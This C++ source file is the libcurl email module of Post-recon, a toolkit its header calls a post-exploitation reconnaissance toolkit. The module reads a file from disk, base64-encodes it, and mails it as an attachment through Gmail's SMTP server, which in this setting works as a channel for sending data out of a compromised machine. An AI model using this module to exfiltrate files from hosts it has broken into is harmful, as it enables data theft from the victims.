/*
This file is part of Post-recon
Copyright (C) 2017 @maldevel
https://github.com/maldevel/Post-recon

Post-recon - post-exploitation reconnaissance toolkit.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

For more see the file 'LICENSE' for copying permission.
*/

#include "prLibCurl.h"

#include <curl/curl.h>
#include "prCommon.h"
#include <Strsafe.h>

#define BOUNDARY	"EEmmaaiill__BBoouunnddaarryy"

struct upload_status {
	int lines_read;
};

//struct upload_status {
//	char *data;
//	size_t bytesLeft;
//};

//static char *_activeHeader;
static char **_emailHeader;
static int base64DataSize = 0;

// .:: email headers ::.

// simple email
#define SimpleEmailHeaderSize	7
static const char *simpleEmailHeader[] = {
	"Date: %s\r\n",						//e.g. Mon, 29 Nov 2010 21:54:29 +1100
	"To: %s (%s)\r\n",					//e.g. admin@example.org
	"From: %s (%s)\r\n",				//e.g. support@example.gr(Joe Doe)
	"Message-ID: <%s>\r\n",				//e.g. xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx@example.com
	"Subject: %s\r\n",					//subject
	"\r\n",								//do not remove
	"%s\r\n"							//body
};

// email with attachment
#define AttachmentEmailHeaderSize	17
static const char *emailWithAttachmentHeader[] = {
	"Date: %s\r\n",
	"To: %s (%s)\r\n",
	"From: %s (%s)\r\n",
	"Message-ID: <%s>\r\n",
	"Subject: %s\r\n",
	"MIME-Version: 1.0\r\n",
	"Content-Type: multipart/mixed; boundary=%s\r\n\r\n",
	"--%s\r\n",
	"Content-type: text/plain; charset=UTF-8\r\n",
	"Content-Transfer-Encoding: 7bit\r\n\r\n",
	"%s",														//body message
	"\r\n--%s\r\n",												//boundary
	"Content-Type: application/octet-stream; name=\"%s\"\r\n",
	"Content-Transfer-Encoding: base64\r\n",
	"Content-Disposition: attachment; filename=\"%s\"\r\n\r\n",
	"%s",														//base64 file data
	"\r\n--%s--\r\n",											//"\r\n--%s--" boundary for multiple files
	//"\r\n.\r\n"
};

// :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


//libcurl email callback
static size_t _read_function_callback(void *ptr, size_t size, size_t nmemb, void *userp)
{
	struct upload_status *upload_ctx = (struct upload_status *)userp;
	const char *data;

	if ((size == 0) || (nmemb == 0) || ((size*nmemb) < 1) /*|| (bytesLeft == 0)*/) {
		return 0;
	}

	data = _emailHeader[upload_ctx->lines_read];
	//size_t len = strlen(data);

	if (data)
	{
		size_t len = strlen(data);
		memcpy(ptr, data, len);
		upload_ctx->lines_read++;
		return len;
	}

	/*if (data && (nmemb * size) >= len)
	{
		bytesLeft = 0;
		memcpy(ptr, data, len);
		upload_ctx->lines_read++;
		return len;
	}*/

	return 0;
}

//build DATE string
static HRESULT buildDate(const char *format, char **result)
{
	if (format == NULL) return S_FALSE;

	char *_dateTime = 0;
	int _size = 0;

	if ((_dateTime = Common::GetTimezoneOffset()) == NULL) {
		return S_FALSE;
	}

	_size = strlen(format) + strlen(_dateTime);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		Common::hFree(_dateTime);
		return S_FALSE;
	}

	if (Common::FormatString(*result, _size + 1, format, _dateTime) == -1) {
		Common::hFree(_dateTime);
		return S_FALSE;
	}

	Common::hFree(_dateTime);
	return S_OK;
}

//build to and from strings
static HRESULT buildToFrom(const char *format, const char *tofrom, const char *name, char **result)
{
	if (format == NULL || tofrom == NULL || name == NULL) return S_FALSE;

	int _size = 0;

	_size = strlen(format) + strlen(tofrom) + strlen(name);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		return S_FALSE;
	}

	if (Common::FormatString(*result, _size + 1, format, tofrom, name) == -1) {
		return S_FALSE;
	}

	return S_OK;
}

//build MessageID string
static HRESULT buildMessageID(const char *format, const char *from, char **result)
{
	if (format == NULL || from == NULL)return S_FALSE;

	char *_messageID = 0;
	int _size = 0;

	if ((Common::GenerateMessageID(from, strlen(from), &_messageID)) == S_FALSE) {
		return S_FALSE;
	}

	_size = strlen(format) + strlen(_messageID);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		Common::hFree(_messageID);
		return S_FALSE;
	}

	if (Common::FormatString(*result, _size + 1, format, _messageID) == -1) {
		Common::hFree(_messageID);
		return S_FALSE;
	}

	Common::hFree(_messageID);
	return S_OK;
}

//build attachment data
static HRESULT buildAttachmentData(const char *format, const char *filepath, char **result)
{
	if (format == NULL || filepath == NULL) return S_FALSE;

	int _size = 0;
	int dataSize = 0;
	unsigned char *data = 0;
	char *base64Data = 0;

	//read file
	if ((dataSize = Common::LoadFileIntoMemory(filepath, &data)) == -1) {
		return S_FALSE;
	}

	//convert file to base64 string
	if ((base64DataSize = Common::Base64Encode(data, dataSize, &base64Data)) == -1) {
		Common::hFree(data);
		return S_FALSE;
	}

	Common::hFree(data);
	_size = strlen(format) + base64DataSize;

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		Common::hFree(base64Data);
		return S_FALSE;
	}

	if (Common::FormatString(*result, _size + 1, format, base64Data) == -1) {
		Common::hFree(base64Data);
		return S_FALSE;
	}

	Common::hFree(base64Data);

	return S_OK;
}

//build string
static HRESULT buildString(const char *format, const char *value, char **result)
{
	if (format == NULL || value == NULL)return S_FALSE;

	int _size = 0;

	_size = strlen(format) + strlen(value);

	if ((*result = (char*)Common::hAlloc((_size + 1) * sizeof(char))) == NULL) {
		return S_FALSE;
	}

	if (Common::FormatString(*result, _size + 1, format, value) == -1) {
		return S_FALSE;
	}

	return S_OK;
}

//build email message
static HRESULT buildMessage(char **_data, const char *to, const char *from, const char *fromName, const char *toName, const char *subject,
	const char *body, const char **emailHeader, int sendAttachment, const char *filepath, const char *filename)
{
	if (from == NULL || fromName == NULL || to == NULL || toName == NULL || subject == NULL || body == NULL || emailHeader == NULL) return S_FALSE;

	//build DATE string
	if ((buildDate(emailHeader[0], &_data[0])) == S_FALSE) {
		return S_FALSE;
	}

	//build TO string
	if ((buildToFrom(emailHeader[1], to, toName, &_data[1])) == S_FALSE) {
		Common::hFree(_data);
		return S_FALSE;
	}

	//build FROM string
	if ((buildToFrom(emailHeader[2], from, fromName, &_data[2])) == S_FALSE) {
		Common::hFree(_data);
		return S_FALSE;
	}

	//build messageid string
	if ((buildMessageID(emailHeader[3], from, &_data[3])) == S_FALSE) {
		Common::hFree(_data);
		return S_FALSE;
	}

	//build subject string
	if ((buildString(emailHeader[4], subject, &_data[4])) == S_FALSE) {
		Common::hFree(_data);
		return S_FALSE;
	}

	if (sendAttachment == FALSE) {

		//add new line
		if ((_data[5] = (char*)Common::hAlloc((strlen(emailHeader[5]) + 1) * sizeof(char))) == NULL) {
			Common::hFree(_data);
			return S_FALSE;
		}

		if (Common::CopyString(_data[5], (strlen(emailHeader[5]) + 1), emailHeader[5]) != 0) {
			Common::hFree(_data);
			return S_FALSE;
		}

		// append body
		if ((buildString(emailHeader[6], body, &_data[6])) == S_FALSE) {
			Common::hFree(_data);
			return S_FALSE;
		}

	}
	else {

		//add mime type
		if ((_data[5] = (char*)Common::hAlloc((strlen(emailHeader[5]) + 1) * sizeof(char))) == NULL) {
			Common::hFree(_data);
			return S_FALSE;
		}

		if (Common::CopyString(_data[5], (strlen(emailHeader[5]) + 1), emailHeader[5]) != 0) {
			Common::hFree(_data);
			return S_FALSE;
		}

		// append content-type mixed + define boundary
		if ((buildString(emailHeader[6], BOUNDARY, &_data[6])) == S_FALSE) {
			Common::hFree(_data);
			return S_FALSE;
		}

		//add boundary
		if ((buildString(emailHeader[7], BOUNDARY, &_data[7])) == S_FALSE) {
			Common::hFree(_data);
			return S_FALSE;
		}

		//add content-type for text
		if ((_data[8] = (char*)Common::hAlloc((strlen(emailHeader[8]) + 1) * sizeof(char))) == NULL) {
			Common::hFree(_data);
			return S_FALSE;
		}

		if (Common::CopyString(_data[8], (strlen(emailHeader[8]) + 1), emailHeader[8]) != 0) {
			Common::hFree(_data);
			return S_FALSE;
		}

		//append Content - Transfer - Encoding
		if ((_data[9] = (char*)Common::hAlloc((strlen(emailHeader[9]) + 1) * sizeof(char))) == NULL) {
			Common::hFree(_data);
			return S_FALSE;
		}

		if (Common::CopyString(_data[9], (strlen(emailHeader[9]) + 1), emailHeader[9]) != 0) {
			Common::hFree(_data);
			return S_FALSE;
		}

		// append body
		if ((buildString(emailHeader[10], body, &_data[10])) == S_FALSE) {
			Common::hFree(_data);
			return S_FALSE;
		}

		//add boundary
		if ((buildString(emailHeader[11], BOUNDARY, &_data[11])) == S_FALSE) {
			Common::hFree(_data);
			return S_FALSE;
		}

		//content type for attachment
		if ((buildString(emailHeader[12], filename, &_data[12])) == S_FALSE) {
			Common::hFree(_data);
			return S_FALSE;
		}

		//append Content - Transfer - Encoding
		if ((_data[13] = (char*)Common::hAlloc((strlen(emailHeader[13]) + 1) * sizeof(char))) == NULL) {
			Common::hFree(_data);
			return S_FALSE;
		}

		if (Common::CopyString(_data[13], (strlen(emailHeader[13]) + 1), emailHeader[13]) != 0) {
			Common::hFree(_data);
			return S_FALSE;
		}

		//Content-Disposition
		if ((buildString(emailHeader[14], filename, &_data[14])) == S_FALSE) {
			Common::hFree(_data);
			return S_FALSE;
		}

		//base64 data
		if ((buildAttachmentData(emailHeader[15], filepath, &_data[15])) == S_FALSE) {
			Common::hFree(_data);
			return S_FALSE;
		}

		//add boundary - end
		if ((buildString(emailHeader[16], BOUNDARY, &_data[16])) == S_FALSE) {
			Common::hFree(_data);
			return S_FALSE;
		}

	}

	return S_OK;
}

HRESULT LibCurl::SendEmail(const char *from, const char *fromName, const char *to, const char *toName, const char *subject,
	const char *body, const char *password, int sendAttachment, const char *filepath, const char *filename)
{
	if (from == NULL || fromName == NULL || to == NULL || toName == NULL || subject == NULL || body == NULL || password == NULL) return S_FALSE;

	CURL *curl;
	CURLcode res = CURLE_OK;
	struct curl_slist *recipients = NULL;
	struct upload_status upload_ctx;
	int dataSize = SimpleEmailHeaderSize;
	int i = 0;

	upload_ctx.lines_read = 0;

	Common::init();

	if (sendAttachment == TRUE) {
		dataSize = AttachmentEmailHeaderSize;
	}

	if ((_emailHeader = (char**)Common::hAlloc(dataSize * sizeof(char*))) == NULL) {
		return S_FALSE;
	}

	if (sendAttachment == FALSE) {
		buildMessage(_emailHeader, to, from, fromName, toName, subject, body, simpleEmailHeader, FALSE, filepath, filename);
	}
	else {
		buildMessage(_emailHeader, to, from, fromName, toName, subject, body, emailWithAttachmentHeader, TRUE, filepath, filename);
	}

	curl = curl_easy_init();

	if (curl) {

		curl_easy_setopt(curl, CURLOPT_USERNAME, from);
		curl_easy_setopt(curl, CURLOPT_PASSWORD, password);
		curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
		curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
		curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from);
		recipients = curl_slist_append(recipients, to);
		curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
		/*if (base64DataSize > CURLOPT_INFILESIZE_LARGE)
			curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, base64DataSize * 2);*/
		curl_easy_setopt(curl, CURLOPT_READFUNCTION, _read_function_callback);
		curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L); //debug, turn it off on production

		res = curl_easy_perform(curl);
		//if (res != CURLE_OK) {}
		curl_slist_free_all(recipients);
		curl_easy_cleanup(curl);
	}

	for (i = 0; i < dataSize; i++) {
		Common::hFree(_emailHeader[i]);
	}

	Common::hFree(_emailHeader);
	//Common::hZero((void*)password, strlen(password));

	return (res == CURLE_OK ? S_OK : S_FALSE);
}
